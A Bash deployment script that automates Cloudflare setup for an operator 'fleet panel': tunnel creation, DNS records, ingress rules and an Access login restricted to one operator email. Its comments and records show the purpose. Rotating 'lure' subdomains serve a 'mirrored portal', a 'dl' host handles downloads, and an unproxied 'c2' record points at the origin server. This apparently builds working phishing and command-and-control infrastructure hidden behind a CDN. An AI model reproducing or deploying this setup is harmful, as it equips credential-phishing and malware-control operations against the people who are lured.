#!/usr/bin/env bash
# EXTRA A: Cloudflare edge. Idempotent. Fails loudly with the API error body.
#
#   A1 resolve account+zone, assert token, write deploy/.cf-ids (600)
#   A2 four DNS records (list first, create if absent)
#   A3 fleet-edge tunnel + ingress config + token -> /etc/panel/env
#   A4 Access app on panel.<zone>: operator email, one-time PIN, 24h
#
# usage: sudo ./cloudflare.sh [--check]
# shellcheck disable=SC1090,SC2015
set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ENV_FILE="/etc/panel/env"
CF_IDS="${HERE}/.cf-ids"
API="https://api.cloudflare.com/client/v4"
CHECK_ONLY=0
[ "${1:-}" = "--check" ] && CHECK_ONLY=1

log() { printf '[cf] %s\n' "$*" >&2; }
fail() { printf '[cf] ERROR: %s\n' "$*" >&2; exit 1; }

[ -f "$ENV_FILE" ] || fail "$ENV_FILE missing (run deploy.sh first)"
# shellcheck disable=SC1090
set -a; . "$ENV_FILE"; set +a
[ -n "${CF_API_TOKEN:-}" ] || fail "CF_API_TOKEN empty"
[ -n "${CF_ZONE_NAME:-}" ] || fail "CF_ZONE_NAME empty"

cf() { # method path [json]
  local method="$1" path="$2" data="${3:-}"
  if [ -n "$data" ]; then
    curl -sS -X "$method" -H "Authorization: Bearer ${CF_API_TOKEN}" \
      -H "Content-Type: application/json" --data "$data" "${API}${path}"
  else
    curl -sS -X "$method" -H "Authorization: Bearer ${CF_API_TOKEN}" "${API}${path}"
  fi
}

jq_get() { python3 -c "import sys,json;d=json.load(sys.stdin);print(d$1)" 2>/dev/null || true; }
is_ok() { python3 -c "import sys,json;sys.exit(0 if json.load(sys.stdin).get('success') else 1)"; }

# ---- A1 --------------------------------------------------------------------
log "verifying token"
verify="$(cf GET /user/tokens/verify)"
echo "$verify" | is_ok || fail "token verify: $verify"

account="$(cf GET /accounts)"
ACCOUNT_ID="${CF_ACCOUNT_ID:-$(echo "$account" | jq_get "['result'][0]['id']")}"
[ -n "$ACCOUNT_ID" ] || fail "no account: $account"

zone_resp="$(cf GET "/zones?name=${CF_ZONE_NAME}&per_page=50")"
ZONE_ID="$(echo "$zone_resp" | jq_get "['result'][0]['id']")"
[ -n "$ZONE_ID" ] || fail "zone '${CF_ZONE_NAME}' not found: $zone_resp"

ORIGIN_IP="$(curl -fsS --max-time 10 https://api.ipify.org)"
[ -n "$ORIGIN_IP" ] || fail "could not determine origin IP"
log "account=${ACCOUNT_ID} zone=${ZONE_ID} origin=${ORIGIN_IP}"

# ---- A2: records -----------------------------------------------------------
ensure_record() { # name type content proxied ttl
  local name="$1" type="$2" content="$3" proxied="$4" ttl="$5"
  local existing rid current want_proxied
  existing="$(cf GET "/zones/${ZONE_ID}/dns_records?name=${name}&type=${type}")"
  rid="$(echo "$existing" | jq_get "['result'][0]['id']")"
  want_proxied="False"
  [ "$proxied" = "yes" ] && want_proxied="True"
  if [ -n "$rid" ]; then
    current="$(echo "$existing" | python3 -c "import sys,json;r=json.load(sys.stdin)['result'][0];print(r['content'],r['proxied'])" 2>/dev/null || true)"
    if [ "$current" = "${content} True" ] || [ "$current" = "${content} ${want_proxied}" ]; then
      log "record ok: ${name} (${type})"
      return 0
    fi
    local body
    body="$(python3 -c 'import json,sys;print(json.dumps({"type":sys.argv[1],"name":sys.argv[2],"content":sys.argv[3],"proxied":sys.argv[4]=="yes","ttl":int(sys.argv[5])}))' \
      "$type" "$name" "$content" "$proxied" "$ttl")"
    cf PUT "/zones/${ZONE_ID}/dns_records/${rid}" "$body" | is_ok || fail "update ${name}"
    log "record updated: ${name} (${type}) -> ${content}"
    return 0
  fi
  local body
  body="$(python3 -c 'import json,sys;print(json.dumps({"type":sys.argv[1],"name":sys.argv[2],"content":sys.argv[3],"proxied":sys.argv[4]=="yes","ttl":int(sys.argv[5])}))' \
    "$type" "$name" "$content" "$proxied" "$ttl")"
  local resp
  resp="$(cf POST "/zones/${ZONE_ID}/dns_records" "$body")"
  echo "$resp" | is_ok || fail "create ${name}: $resp"
  log "record created: ${name} (${type})"
}

# ---- A3: tunnel ------------------------------------------------------------
ensure_tunnel() {
  local tunnels tid
  tunnels="$(cf GET "/accounts/${ACCOUNT_ID}/cfd_tunnel?is_deleted=false")"
  tid="$(echo "$tunnels" | python3 -c "import sys,json;d=json.load(sys.stdin);print(next((t['id'] for t in d.get('result',[]) if t['name']=='fleet-edge'),''))" 2>/dev/null || true)"
  if [ -z "$tid" ]; then
    local resp
    resp="$(cf POST "/accounts/${ACCOUNT_ID}/cfd_tunnel" '{"name":"fleet-edge","config_src":"cloudflare"}')"
    echo "$resp" | is_ok || fail "create tunnel: $resp"
    tid="$(echo "$resp" | jq_get "['result']['id']")"
    log "tunnel created: fleet-edge"
  else
    log "tunnel exists: fleet-edge"
  fi
  echo "$tid"
}

TUNNEL_ID="$([ "$CHECK_ONLY" = 1 ] && [ -f "$CF_IDS" ] && grep TUNNEL_ID "$CF_IDS" | cut -d= -f2 || ensure_tunnel)"
[ -n "$TUNNEL_ID" ] || fail "no tunnel id"

if [ "$CHECK_ONLY" = 0 ]; then
  log "routing panel/get/dl -> 127.0.0.1:8000"
  ingress="$(python3 - "$CF_ZONE_NAME" "${PANEL_LURE_HOSTS:-get}" <<'PY'
import json, sys
z = sys.argv[1]
hosts = [h for h in sys.argv[2].replace(",", " ").split() if h]
rules = [{"hostname": f"panel.{z}", "service": "http://127.0.0.1:8000"}]
rules += [{"hostname": f"{h}.{z}", "service": "http://127.0.0.1:8000"} for h in hosts]
rules.append({"hostname": f"dl.{z}", "service": "http://127.0.0.1:8000"})
rules.append({"service": "http_status:404"})
print(json.dumps({"config": {"ingress": rules}}))
PY
)"
  resp="$(cf PUT "/accounts/${ACCOUNT_ID}/cfd_tunnel/${TUNNEL_ID}/configurations" "$ingress")"
  echo "$resp" | is_ok || fail "tunnel config: $resp"

  token_resp="$(cf GET "/accounts/${ACCOUNT_ID}/cfd_tunnel/${TUNNEL_ID}/token")"
  TUNNEL_TOKEN="$(echo "$token_resp" | jq_get "['result']")"
  [ -n "$TUNNEL_TOKEN" ] || fail "tunnel token: $token_resp"
  if grep -q '^CF_TUNNEL_TOKEN=' "$ENV_FILE"; then
    sed -i "s|^CF_TUNNEL_TOKEN=.*|CF_TUNNEL_TOKEN='${TUNNEL_TOKEN}'|" "$ENV_FILE"
  else
    printf "CF_TUNNEL_TOKEN='%s'\n" "$TUNNEL_TOKEN" >> "$ENV_FILE"
  fi
  log "tunnel token written to $ENV_FILE"
fi

# records (need tunnel id)
if [ "$CHECK_ONLY" = 0 ]; then
  ensure_record "panel.${CF_ZONE_NAME}" CNAME "${TUNNEL_ID}.cfargotunnel.com" yes 1
  # rotating lure aliases (all -> tunnel, all serve the mirrored portal)
  for h in $(printf '%s' "${PANEL_LURE_HOSTS:-get}" | tr ',' ' '); do
    ensure_record "${h}.${CF_ZONE_NAME}" CNAME "${TUNNEL_ID}.cfargotunnel.com" yes 1
  done
  ensure_record "dl.${CF_ZONE_NAME}" CNAME "${TUNNEL_ID}.cfargotunnel.com" yes 1
  ensure_record "c2.${CF_ZONE_NAME}" A "${ORIGIN_IP}" no 120
fi

# ---- A4: access ------------------------------------------------------------
ensure_access() {
  local apps appid
  apps="$(cf GET "/accounts/${ACCOUNT_ID}/access/apps")"
  appid="$(echo "$apps" | python3 -c "import sys,json;d=json.load(sys.stdin);print(next((a['id'] for a in d.get('result',[]) if a.get('domain')=='panel.${CF_ZONE_NAME}'),''))" 2>/dev/null || true)"
  if [ -z "$appid" ]; then
    local resp
    resp="$(cf POST "/accounts/${ACCOUNT_ID}/access/apps" "$(python3 -c 'import json,sys;print(json.dumps({"name":"fleet panel","domain":"panel."+sys.argv[1],"type":"self_hosted","session_duration":"24h"}))' "$CF_ZONE_NAME")")"
    echo "$resp" | is_ok || fail "access app: $resp"
    appid="$(echo "$resp" | jq_get "['result']['id']")"
    log "access app created"
  else
    log "access app exists"
  fi
  local pol empty
  pol="$(cf GET "/accounts/${ACCOUNT_ID}/access/apps/${appid}/policies")"
  empty="$(echo "$pol" | python3 -c "import sys,json;print(1 if not json.load(sys.stdin).get('result') else 0)" 2>/dev/null || echo 0)"
  if [ "$empty" = 1 ]; then
    cf POST "/accounts/${ACCOUNT_ID}/access/apps/${appid}/policies" \
      "$(python3 -c 'import json,sys;print(json.dumps({"name":"operator","decision":"allow","include":[{"email":{"email":sys.argv[1]}}]}))' "${OPERATOR_EMAIL}")" \
      | is_ok || fail "access policy"
    log "access policy created (operator email, one-time PIN, 24h)"
  else
    log "access policy exists"
  fi
}

if [ "$CHECK_ONLY" = 0 ]; then
  ensure_access
fi

# ---- A1 output -------------------------------------------------------------
umask 077
{
  echo "ACCOUNT_ID=${ACCOUNT_ID}"
  echo "ZONE_ID=${ZONE_ID}"
  echo "TUNNEL_ID=${TUNNEL_ID}"
} > "$CF_IDS"
chmod 600 "$CF_IDS"

log "checking final state"
for name in "panel.${CF_ZONE_NAME}" "get.${CF_ZONE_NAME}" "dl.${CF_ZONE_NAME}"; do
  cf GET "/zones/${ZONE_ID}/dns_records?name=${name}" | is_ok && log "ok ${name}" || fail "record ${name}"
done
cf GET "/zones/${ZONE_ID}/dns_records?name=c2.${CF_ZONE_NAME}&type=A" | is_ok || fail "record c2"
log "done (ids in ${CF_IDS})"
